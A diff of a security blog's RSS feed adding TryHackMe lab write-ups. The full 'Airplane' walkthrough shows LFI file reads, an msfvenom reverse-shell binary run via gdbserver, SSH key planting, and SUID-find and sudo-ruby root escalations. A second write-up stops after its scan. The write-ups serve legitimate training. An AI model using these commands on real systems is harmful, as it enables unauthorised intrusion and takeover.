@@ -6,8 +6,442 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 22 Nov 2024 18:48:22 -0600</lastBuildDate>
+        <lastBuildDate>Wed, 11 Dec 2024 17:41:30 -0600</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM: Airplane</title>
+            <link>https://scorpiosec.com/posts/2024/12/thm-airplane/</link>
+            <pubDate>Wed, 11 Dec 2024 17:41:30 -0600</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/12/thm-airplane/</guid>
+            <description>Platform: TryHackMe Link: Airplane Level: Medium OS: Linux The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to GdbServer. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://tryhackme.com/r/room/airplane" target="_blank" >Airplane</a>
+
+</li>
+<li>Level: Medium</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>The challenge Airplane begins by uncovering a Local File Inclusion (LFI) vulnerability. By exploiting it, we enumerate the target’s running processes and identify one linked to <code>GdbServer</code>. Using an ELF binary crafted with msfvenom, we exploit this tool to gain an initial foothold on the system. Further enumeration reveals a binary with the SUID bit set, enabling us to pivot to another user and retrieve the user flag. We then access the system via SSH as the new user and discover permissions to execute Ruby scripts as the root user. By creating and running a malicious Ruby script, we escalate privileges and obtain root access.</p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.14.32 Airplane
+</code></pre><p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,6048,8000
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-11 17:48 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.14.32
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.21s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>6048/tcp open  x11?
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> NOT FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2024</span> 23:48:23 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">207</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;404 Not Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Not Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">302</span> FOUND
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">11</span> Dec <span style="color:#ae81ff">2024</span> 23:48:17 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">269</span>
+</span></span><span style="display:flex;"><span>|     Location: http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span>en&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://airplane.thm:8000/?page=index.html&#34;</span>&gt;http://airplane.thm:8000/?page<span style="color:#f92672">=</span>index.html&lt;/a&gt;. If not, click the link.
+</span></span><span style="display:flex;"><span>|   Socks5: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request syntax <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8000-TCP:V<span style="color:#f92672">=</span>7.94SVN%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>12/11%Time<span style="color:#f92672">=</span>675A24C2%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%
+</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>GetRequest,1F3,<span style="color:#e6db74">&#34;HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.2\x20Python/3\.8\.10\r\nDate:\x20Wed,\x2011\x20Dec\x202024\x2023:48:1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:7\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:gth:\x20269\r\nLocation:\x20http://airplane\.thm:8000/\?page=index\.htm
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:l\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n&lt;title&gt;Redirecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0URL:\x20&lt;a\x20href=\&#34;http://airplane\.thm:8000/\?page=index\.html\&#34;&gt;ht
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tp://airplane\.thm:8000/\?page=index\.html&lt;/a&gt;\.\x20If\x20not,\x20click
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20the\x20link\.\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourOhFourRequest,184,<span style="color:#e6db74">&#34;HTTP/1\.1\x20404\x20NOT\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20FOUND\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.8\.10\r\nDate:\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Wed,\x2011\x20Dec\x202024\x2023:48:23\x20GMT\r\nContent-Type:\x20text/h
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tml;\x20charset=utf-8\r\nContent-Length:\x20207\r\nConnection:\x20close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;404\x20Not\x20Fou
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nd&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20again\.&lt;/p&gt;\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Socks5,213,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&#34;-//W3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\&#34;http:/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&#34;Content-Type\&#34;\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;/p&gt;\n\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BA
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:D_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20meth
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:od\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 181.28 seconds
+</span></span></code></pre></div><p>Our nmap scan discover three open ports:</p>
+<ul>
+<li>22 - SSH</li>
+<li>6048 - nmap is not able to accurately determine the service on this port</li>
+<li>8000 - A web server with Python Werkzeug. We also have a redirection to <code>airplane.thm</code> which we add to the <code>/etc/hosts</code> file.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p>Browsing to the website lead us to <code>http://airplane.thm:8000/?page=index.html</code> where we find a static website with various information about airplanes. We also note the presence of <code>?page=index.html</code> possibly pointing to an LFI vulnerability if security controls are lacking.</p>
+<p><img src="/images/THM-Airplane/airplane_website.png" alt="Airplane website"></p>
+<p>In Burp we confirm the presence of the LFI vulnerability.</p>
+<p><img src="/images/THM-Airplane/LFI_confirmed.png" alt="LFI confirmed"></p>
+<p>We can read the <code>/etc/passwd</code> to find out the users on the target system.</p>
+<p><img src="/images/THM-Airplane/users_list.png" alt="user accounts"></p>
+<p>Here is the full content of the <code>/etc/passwd</code> file, we notice two user accounts <code>carlos</code> and <code>hudson</code>.</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+whoopsie:x:120:125::/nonexistent:/bin/false
+colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
+pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
+gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
+sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+hudson:x:1001:1001::/home/hudson:/bin/bash
+sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
+</code></pre><p>Trying to read the <code>user.txt</code> file in the home folder of <code>carlos</code> or <code>hudson</code> fails.</p>
+<p><img src="/images/THM-Airplane/carlos_home_folder.png" alt="carlos Home folder"></p>
+<p><img src="/images/THM-Airplane/hudson_home_folder.png" alt="hudson home fodler"></p>
+<p>Let&rsquo;s continue our enumeration with some directory bruteforcing.</p>
+<p><img src="/images/THM-Airplane/gobuster_cmd.png" alt="directory bruteforcing with Gobuster"></p>
+<p>At <code>http://airplane.thm:8000/airplane</code> we find an animation with the message &ldquo;Let&rsquo;s Fly&rdquo;, this is probably not a viable exploitation path. Additionally, the subdomain enumeration does not give any results.</p>
+<p><img src="/images/THM-Airplane/letsfly.png" alt="airplane directory"></p>
+<p>We can leverage the LFI vulnerability to find information about the processes running on the target. Each process running on a Linux system has a corresponding directory under the <code>/proc</code> filesystem, and within that directory there is a file named <code>cmdline</code>.</p>
+<p>For example <code>/proc/100/cmdline</code> will contain the command-line arguments that were used to start the process with PID <code>100</code>. These file can contain sensitive information such as passwords, API keys, etc.</p>
+<p>In order to enumerate the processes on the target, we use the Intruder feature in Burp. We use the payload <code>../../../../proc/x/cmdline</code> with the section sign around the <code>x</code>.</p>
+<p><img src="/images/THM-Airplane/payload_intruder.png" alt="payload in intruder"></p>
+<p>For the payload settings we select <code>Numbers</code> going sequentially from 1 to 10000 (You can pick a smaller number like 1000) and start the attack. Because of the rate limit in Burp CE, the process will take a long time but we can continue our enumeration as the attack progresses.</p>
+<blockquote>
+<p>I recommend using <a href="https://caido.io/" target="_blank" >Caido</a>
+
+ for this type of attack because it does not have the rate limit issue.</p>
+</blockquote>
+<p>After sorting by length, you will find a request with the response being <code>/usr/bin/gdbserver0.0.0.0:6048airplane</code>. (The specific request is always found among those with a length of approximately 400 bytes)</p>
+<p><img src="/images/THM-Airplane/gdbserver.png" alt="gdbserver process"></p>
+<h2 id="initial-foothold-shell-as-hudson">Initial Foothold (shell as hudson)</h2>
+<p>Searching <code>gdbserver reverse shell</code> on Google, we find <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver" target="_blank" >this HackTricks page</a>
+
+ explaining how to exploit this tool. Let&rsquo;s follow the steps:</p>
+<ol>
+<li>Create an elf backdoor</li>
+</ol>
+<pre tabindex="0"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_ADDRESS LPORT=PORT PrependFork=true -f elf -o binary.elf
+</code></pre><p><img src="/images/THM-Airplane/elf_backdoor.png" alt="elf backdoor"></p>
+<ol start="2">
+<li>Make it executable</li>
+</ol>
+<pre tabindex="0"><code>chmod +x binary.elf
+</code></pre><ol start="3">
+<li>Launch GDB to debug the executable</li>
+</ol>
+<pre tabindex="0"><code>gdb binary.elf
+</code></pre><p><img src="/images/THM-Airplane/gdb_elf.png" alt="Open the elf with GDB"></p>
+<ol start="4">
+<li>Set the remote debuger target</li>
+</ol>
+<pre tabindex="0"><code>target extended-remote airplane.thm:6048
+</code></pre><p><img src="/images/THM-Airplane/elf_target_set.png" alt="Set the remote target"></p>
+<ol start="5">
+<li>Upload the elf file</li>
+</ol>
+<pre tabindex="0"><code>remote put binary.elf /tmp/binary.elf
+</code></pre><p><img src="/images/THM-Airplane/elf_upload.png" alt="elf backdoor upload"></p>
+<ol start="6">
+<li>Set the remote executable file</li>
+</ol>
+<pre tabindex="0"><code>set remote exec-file /tmp/binary.elf
+</code></pre><ol start="7">
+<li>Execute the reverse shell executable</li>
+</ol>
+<blockquote>
+<p>Make sure your listener is set to the port number you decided in step 1</p>
+</blockquote>
+<pre tabindex="0"><code>run
+y
+</code></pre><p><img src="/images/THM-Airplane/revshell_executed.png" alt="Reverse shell executed"></p>
+<p>On the listener we receive a connection as <code>hudson</code>.</p>
+<p><img src="/images/THM-Airplane/foothold.png" alt="Foothold"></p>
+<p>We upgrade our shell with the following commands</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+stty rows 38 columns 116
+</code></pre><p><img src="/images/THM-Airplane/shell_upgrade.png" alt="Shell Upgrade"></p>
+<p>The user flag is not on this account, so we have to move to the second account.</p>
+<h3 id="lateral-movement-shell-as-carlos">Lateral Movement (shell as carlos)</h3>
+<p>We run linpeas and find that <code>/usr/bin/find</code> has the SUID bit set and it is owned by <code>carlos</code>.</p>
+<p><img src="/images/THM-Airplane/find_binary.png" alt="find binary with SUID bit set"></p>
+<p>On <a href="https://gtfobins.github.io/gtfobins/find/" target="_blank" >GTFObins</a>
+
+ we find a payload to escalate our privileges and the user flag is in <code>/home/carlos</code>.</p>
+<pre tabindex="0"><code>/usr/bin/find . -exec /bin/bash -p \; -quit
+</code></pre><p><img src="/images/THM-Airplane/user_flag.png" alt="user flag"></p>
+<p>With <code>ls -la</code> we notice the <code>.ssh</code> directory. We can add an ssh key to <code>/home/carlos/.ssh/authorized_keys</code> to be able to login via SSH as <code>carlos</code>.</p>
+<p>We generate a key pair with</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa -b 2048 -f carlos
+</code></pre><p><img src="/images/THM-Airplane/keygen_carlos.png" alt="SSH keygen"></p>
+<p>We store the content of <code>carlos.pub</code> in <code>/home/carlos/.ssh/authorized_keys</code> using</p>
+<pre tabindex="0"><code>echo &#39;CONTENT OF carlos.pub&#39; &gt; /home/carlos/.ssh/authorized_keys
+
+chmod 600 /home/carlos/.ssh/authorized_keys
+</code></pre><p><img src="/images/THM-Airplane/SSH_setup.png" alt="SSH setup"></p>
+<p>On our local machine we login as carlos with</p>
+<pre tabindex="0"><code>ssh -i carlos carlos@airplane.thm
+</code></pre><p><img src="/images/THM-Airplane/shh_login_carlos.png" alt="SSH login as carlos"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>With <code>sudo -l</code> we learn that <code>carlos</code> is allowed to run any Ruby script located in <code>/root</code> as the root user without providing a password.</p>
+<p><img src="/images/THM-Airplane/sudo-l.png" alt="sudo -l command"></p>
+<p>This is easily abused by creating our own ruby file containing a command to spawn a shell, moreover because the wildcard <code>*</code> we can execute our file even if it is outside of <code>/root</code>.</p>
+<pre tabindex="0"><code>echo &#39;exec &#34;/bin/sh&#34;&#39; &gt; root.rb
+
+sudo /usr/bin/ruby /root/../home/carlos/root.rb
+</code></pre><p>After executing the two commands above, we gain access to the root account and can read the <code>root.txt</code> file.</p>
+<p><img src="/images/THM-Airplane/root_flag.png" alt="root flag"></p>
+<p>Thank you for taking the time to read this write up, I hope you found it useful.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: The Sticker Shop</title>
+            <link>https://scorpiosec.com/posts/2024/12/thm-the-sticker-shop/</link>
+            <pubDate>Wed, 04 Dec 2024 16:26:19 -0600</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/12/thm-the-sticker-shop/</guid>
+            <description>Platform: TryHackMe Link: The Sticker Shop Level: Easy This is a pretty straightforward room where we need to leverage a Cross-Site Scripting vulnerability in order to read the flag.
+Scanning ./nmap_scan.sh &amp;lt;IP_PROVIDED&amp;gt; The_Sticker_Shop You can find the script I use to scan targets here .
+Results
+Running detailed scan on open ports: 22,8080 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-04 16:38 CST Nmap scan report for 10.10.139.96 Host is up (0.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: TryHackMe</li>
+<li>Link: <a href="https://tryhackme.com/r/room/thestickershop" target="_blank" >The Sticker Shop</a>
+
+</li>
+<li>Level: Easy</li>
+</ul>
+<hr>
+<p>This is a pretty straightforward room where we need to leverage a Cross-Site Scripting vulnerability in order to read the flag.</p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>./nmap_scan.sh &lt;IP_PROVIDED&gt; The_Sticker_Shop
+</code></pre><blockquote>
+<p>You can find the script I use to scan targets <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/nmap_scan.sh" target="_blank" >here</a>
+
+.</p>
+</blockquote>
+<p><strong>Results</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,8080
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-04 16:38 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.139.96
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.27s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy Werkzeug/3.0.1 Python/3.8.10
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/3.0.1 Python/3.8.10
+</span></span><span style="display:flex;"><span>|_http-title: Cat Sticker Shop
